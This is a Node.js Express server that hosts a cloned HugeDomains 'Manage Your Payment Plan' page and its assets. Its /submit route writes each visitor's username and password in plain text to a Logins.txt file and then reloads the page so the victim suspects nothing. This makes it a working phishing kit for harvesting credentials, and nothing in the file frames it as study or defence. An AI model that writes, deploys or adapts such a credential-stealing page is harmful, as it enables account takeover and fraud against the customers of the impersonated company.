
var http=require('http');
var fs = require('fs');
var url = require('url');
const path = require('path');
var bodyParser = require('body-parser')
let express = require('express');

let app = express() 
app.use( bodyParser.json() );
app.use(bodyParser.urlencoded({   
  extended: true
}));
app.use(express.static('Manage%20Your%20Payment%20Plan%20_%20HugeDomains_files'));
app.use(express.json());
app.use(express.urlencoded());
app.get('/', (req, res)=>{
    var index;
    index = fs.readFileSync(('Manage Your Payment Plan _ HugeDomains.html'), 'utf8');
    res.send(index);
});
app.get('/Manage%20Your%20Payment%20Plan%20_%20HugeDomains_files/style.css', (request, responseC) => {
    
    responseC.sendFile(path.join(__dirname, "\\Manage%20Your%20Payment%20Plan%20_%20HugeDomains_files\\style.css"))
});
app.get('/Manage%20Your%20Payment%20Plan%20_%20HugeDomains_files/jquery.fancybox.min.css', (request, responseC) => {
    
    responseC.sendFile(path.join(__dirname, "\\Manage%20Your%20Payment%20Plan%20_%20HugeDomains_files\\jquery.fancybox.min.css"))
});
app.get('/Manage%20Your%20Payment%20Plan%20_%20HugeDomains_files/hd-style.css', (request, responseC) => {
    
    responseC.sendFile(path.join(__dirname, "\\Manage%20Your%20Payment%20Plan%20_%20HugeDomains_files\\hd-style.css"))
});
app.get('/Manage%20Your%20Payment%20Plan%20_%20HugeDomains_files/hd-style-print.css', (request, responseC) => {
    
    responseC.sendFile(path.join(__dirname, "\\Manage%20Your%20Payment%20Plan%20_%20HugeDomains_files\\hd-style-print.css"))
});
app.get('/Manage%20Your%20Payment%20Plan%20_%20HugeDomains_files/reboot.min.css', (request, responseC) => {
    
    responseC.sendFile(path.join(__dirname, "\\Manage%20Your%20Payment%20Plan%20_%20HugeDomains_files\\reboot.min.css"))
});
app.get('/Manage%20Your%20Payment%20Plan%20_%20HugeDomains_files/responsive.css', (request, responseC) => {
    
    responseC.sendFile(path.join(__dirname, "\\Manage%20Your%20Payment%20Plan%20_%20HugeDomains_files\\responsive.css"))
});
app.get('/Manage%20Your%20Payment%20Plan%20_%20HugeDomains_files/zyw6mds.css', (request, responseC) => {
    
    responseC.sendFile(path.join(__dirname, "\\Manage%20Your%20Payment%20Plan%20_%20HugeDomains_files\\zyw6mds.css"))
});
app.get('/Manage%20Your%20Payment%20Plan%20_%20HugeDomains_files/styles__Itr.css', (request, responseC) => {
    
    responseC.sendFile(path.join(__dirname, "\\Manage%20Your%20Payment%20Plan%20_%20HugeDomains_files\\styles__Itr.css"))
});
app.get('/Manage%20Your%20Payment%20Plan%20_%20HugeDomains_files/hd-header-logo-v3.svg', (request, responseC) => {
    
    responseC.sendFile(path.join(__dirname, "\\Manage%20Your%20Payment%20Plan%20_%20HugeDomains_files\\hd-header-logo-v3.svg"))
});
app.get('/Manage%20Your%20Payment%20Plan%20_%20HugeDomains_files/phone-icon.png', (request, responseC) => {
    
    responseC.sendFile(path.join(__dirname, "\\Manage%20Your%20Payment%20Plan%20_%20HugeDomains_files\\phone-icon.png"))
});
app.post('/submit', (req, res) => {
    var userData ="";
    userData+="Username: "+req.body.username+"\n"
    userData+="Password: "+req.body.password+"\n\n"
    fs.appendFile("Logins.txt", userData, function (err){
        if(err) throw err;
    })
    var index;
    index = fs.readFileSync(('Manage Your Payment Plan _ HugeDomains.html'), 'utf8');
    res.send(index);
});
var server = app.listen(4000, (err)=>{
    if(err)
        throw err;
    console.log('listening on port 4000');
});